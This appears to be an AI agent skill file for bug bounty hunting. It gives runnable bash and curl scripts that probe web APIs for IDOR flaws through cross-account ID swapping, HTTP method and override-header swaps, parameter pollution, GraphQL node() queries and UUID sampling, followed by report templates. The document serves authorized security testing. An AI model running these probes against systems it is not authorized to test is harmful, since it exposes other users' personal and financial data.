---
name: k1nzr3c0n-hunt-idor
description: "IDOR hunting skill built from 26 disclosed bug bounty reports. Covers numeric/UUID/hash ID patterns, HTTP method swap, array wrap, GraphQL node(), and two-account cross-tenant verification. Integrates with k1nzr3c0n endpoint discovery output."
tags: [idor, bac, broken-access-control, hunt, web-security, bug-bounty]
report_count: 26
---

# K1NZR3C0N Hunt — IDOR / Broken Access Control

> **Two-Account Rule**: ALWAYS test with two distinct accounts. IDOR requires cross-account proof.
> **Body-Diff Rule**: Accessing /users/2 with account-1's token must return DIFFERENT data than /users/1.

---

## Crown Jewels (Highest Payout IDOR)

```
Priority 1 — Access another user's PII (name, email, SSN, payment method)
Priority 2 — Read/modify another user's financial data (orders, invoices, balance)
Priority 3 — Delete/modify another user's content (posts, settings, account)
Priority 4 — Escalate role (view admin-only resources)
Priority 5 — Mass enumeration of user data (iterable IDs)
```

---

## Phase 0 — Bootstrap

```bash
TARGET="${TARGET:-}"
ACCT1_TOKEN="${ACCT1_TOKEN:-}"  # Your primary account token
ACCT2_TOKEN="${ACCT2_TOKEN:-}"  # Your secondary account token (different user)
ACCT2_ID="${ACCT2_ID:-}"       # User ID of secondary account

if [ -z "$ACCT1_TOKEN" ] || [ -z "$ACCT2_TOKEN" ]; then
  echo "Set ACCT1_TOKEN and ACCT2_TOKEN before running"
  echo "Create two accounts on $TARGET to test cross-account access"
  exit 1
fi

HUNT="/tmp/hunt_idor_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
echo "[+] Target   : $TARGET"
echo "[+] Acct1 ID : $ACCT1_ID"
echo "[+] Acct2 ID : $ACCT2_ID"
```

## Phase 1 — Discover IDOR Candidates from Recon

```bash
RUNS_BASE="/app/runs"
echo "=== IDOR Candidate Endpoints ==="

# Numeric ID patterns
grep -rhoP 'https?://[^\s"]+/[0-9]{1,10}(?:[/?#]|\s|$)' "$RUNS_BASE" 2>/dev/null \
  | sort -u | tee "$HUNT/numeric_idor.txt" | wc -l | xargs echo "Numeric ID endpoints:"

# UUID patterns
grep -rhoP 'https?://[^\s"]+/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/uuid_idor.txt" | wc -l | xargs echo "UUID endpoints:"

# Query parameter ID patterns
grep -rhoP 'https?://[^\s"]+[?&](?:id|uid|user_id|account_id|order_id|invoice_id|doc_id|file_id|report_id)=[0-9a-zA-Z\-]+' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/param_idor.txt" | wc -l | xargs echo "Parameter ID endpoints:"

# Show top candidates
echo ""
echo "Top numeric IDOR candidates:"
head -15 "$HUNT/numeric_idor.txt" | sed 's/^/  /'
echo ""
echo "Top parameter IDOR candidates:"
head -15 "$HUNT/param_idor.txt" | sed 's/^/  /'
```

## Phase 2 — Two-Account Horizontal IDOR Test

```bash
echo "=== Horizontal IDOR: Account 1 accessing Account 2 resources ==="

# Get Account 2's resource IDs (logged in as account 2)
echo "Step 1: Log in as Account 2, collect resource IDs:"
echo "  curl -sk 'https://${TARGET}/api/user/me' -H 'Authorization: Bearer ${ACCT2_TOKEN}'"
ACCT2_PROFILE=$(curl -sk "https://${TARGET}/api/v1/user/me" \
  -H "Authorization: Bearer ${ACCT2_TOKEN}" 2>/dev/null)
echo "$ACCT2_PROFILE" | python3 -m json.tool 2>/dev/null | grep -E '"id"|"uuid"|"user_id"' | head -10

echo ""
echo "Step 2: Access Account 2 resources using Account 1's token:"

# Test each IDOR candidate endpoint pattern
for ENDPOINT_TEMPLATE in \
  "/api/v1/users/${ACCT2_ID}" \
  "/api/v1/users/${ACCT2_ID}/profile" \
  "/api/v1/users/${ACCT2_ID}/orders" \
  "/api/v1/accounts/${ACCT2_ID}" \
  "/api/v1/profile?user_id=${ACCT2_ID}" \
  "/api/v1/settings?uid=${ACCT2_ID}"; do
  
  RESP=$(curl -sk -w "\n%{http_code}" "https://${TARGET}${ENDPOINT_TEMPLATE}" \
    -H "Authorization: Bearer ${ACCT1_TOKEN}")
  STATUS=$(echo "$RESP" | tail -1)
  BODY_LEN=$(echo "$RESP" | head -n -1 | wc -c)
  
  if [ "$STATUS" -lt 400 ] && [ "$BODY_LEN" -gt 10 ]; then
    echo "  [POTENTIAL $STATUS] $ENDPOINT_TEMPLATE (${BODY_LEN} bytes)"
    # Compare with accessing own resource
    OWN_EP="${ENDPOINT_TEMPLATE/$ACCT2_ID/$ACCT1_ID}"
    OWN_RESP=$(curl -sk "https://${TARGET}${OWN_EP}" -H "Authorization: Bearer ${ACCT1_TOKEN}")
    echo "  Own resource body: $(echo "$OWN_RESP" | wc -c) bytes"
  fi
done
```

## Phase 3 — HTTP Method Swap (IDOR Bypass)

```bash
echo "=== HTTP Method Swap Testing ==="
# If GET returns 403, try POST/PUT/PATCH/DELETE/OPTIONS
PROTECTED_EP="https://${TARGET}/api/v1/users/${ACCT2_ID}"

for METHOD in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  STATUS=$(curl -sk -X "$METHOD" -o /dev/null -w '%{http_code}' "$PROTECTED_EP" \
    -H "Authorization: Bearer ${ACCT1_TOKEN}" \
    -H "Content-Type: application/json" \
    -d "{\"id\": \"${ACCT2_ID}\"}")
  echo "  [$METHOD] $STATUS"
done

echo ""
echo "=== Override Headers (some frameworks respect these) ==="
for OVERRIDE in "X-HTTP-Method-Override: GET" "X-Method-Override: GET" "_method=GET"; do
  STATUS=$(curl -sk -X POST -o /dev/null -w '%{http_code}' "$PROTECTED_EP" \
    -H "Authorization: Bearer ${ACCT1_TOKEN}" \
    -H "$OVERRIDE")
  echo "  [$OVERRIDE] $STATUS"
done
```

## Phase 4 — Parameter Pollution & Array Wrap

```bash
echo "=== Parameter Pollution ==="
BASE_EP="https://${TARGET}/api/v1/users"

# Array wrap: some frameworks take first element
curl -sk "${BASE_EP}?id=${ACCT1_ID}&id=${ACCT2_ID}" \
  -H "Authorization: Bearer ${ACCT1_TOKEN}" | python3 -m json.tool 2>/dev/null | head -20

# JSON body array wrap
curl -sk -X POST "${BASE_EP}/profile" \
  -H "Authorization: Bearer ${ACCT1_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "[\"${ACCT2_ID}\"]" | python3 -m json.tool 2>/dev/null | head -10

# Parameter in unexpected location (body vs URL)
curl -sk -X GET "${BASE_EP}/${ACCT2_ID}" \
  -H "Authorization: Bearer ${ACCT1_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{\"user_id\": \"${ACCT1_ID}\"}" | python3 -m json.tool 2>/dev/null | head -10

echo ""
echo "=== Wildcard / Global ID Patterns ==="
for WILDCARD in "0" "-1" "null" "undefined" "me" "self" "current" "*" "all"; do
  STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "${BASE_EP}/${WILDCARD}" \
    -H "Authorization: Bearer ${ACCT1_TOKEN}")
  [ "$STATUS" -lt 400 ] && echo "  [EXISTS $STATUS] /users/$WILDCARD"
done
```

## Phase 5 — GraphQL IDOR via node()

```bash
# GraphQL node() interface often bypasses type-level auth
GQL_EP="https://${TARGET}/graphql"
echo "=== GraphQL IDOR via node() ==="

# Encode account 2 ID as base64 (common GraphQL global ID format)
GLOBAL_ID=$(echo -n "User:${ACCT2_ID}" | base64)
echo "Testing global ID: $GLOBAL_ID"

curl -sk "$GQL_EP" \
  -H "Authorization: Bearer ${ACCT1_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"{ node(id: \\\"${GLOBAL_ID}\\\") { ... on User { id email name } } }\"}" \
  | python3 -m json.tool 2>/dev/null

echo ""
echo "=== GraphQL: Direct user query by ID ==="
curl -sk "$GQL_EP" \
  -H "Authorization: Bearer ${ACCT1_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"{ user(id: ${ACCT2_ID}) { id email phone address } }\"}" \
  | python3 -m json.tool 2>/dev/null
```

## Phase 6 — UUID / Hash Prediction

```bash
echo "=== UUID Entropy Check ==="
echo "Collect 10+ UUIDs from account 2's resources and analyze:"

# If UUIDs are v4 (random) → cannot predict
# If UUIDs are v1 (time-based) or sequential → may predict

# Collect multiple IDs
for I in $(seq 1 5); do
  UUID=$(curl -sk "https://${TARGET}/api/v1/items" \
    -H "Authorization: Bearer ${ACCT2_TOKEN}" 2>/dev/null \
    | grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | head -1)
  echo "  UUID $I: $UUID"
done

echo ""
echo "UUID version check (4th group 1st char): 4=random, 1=time-based"
```

## Phase 7 — Gate 0 Validation

```bash
echo "=== IDOR Gate 0 Checklist ==="
echo ""
echo "  □ Two DISTINCT accounts tested (not same user, different sessions)"
echo "  □ Account 1 accessed ACCOUNT 2's data (not own data)"
echo "  □ Response body is DIFFERENT from own data (body-diff rule)"
echo "  □ Data returned belongs to account 2 (verify name/email/etc.)"
echo "  □ No privileged access needed (e.g. not admin→user, but user1→user2)"
echo "  □ Impact: actual PII, financial data, or state change accessed"
echo ""
echo "  /skill k1nzr3c0n-triage → 7Q gate before submitting"
```

---

## Report Title Formula

```
IDOR in [/api/v1/users/{id}] allows any authenticated user to read other users' [PII/orders/payment data]
Broken Access Control on [resource] via [HTTP method swap / array wrap / GraphQL node()] exposes cross-account data
```

## Evidence Required

```
1. Account 2 resource ID and ownership proof (logged in as acct2, showing the data belongs to acct2)
2. Request with Account 1's token accessing Account 2's resource
3. Response showing Account 2's data (highlight the identifying field)
4. Comparison: same request with Account 1's own ID → different data
```
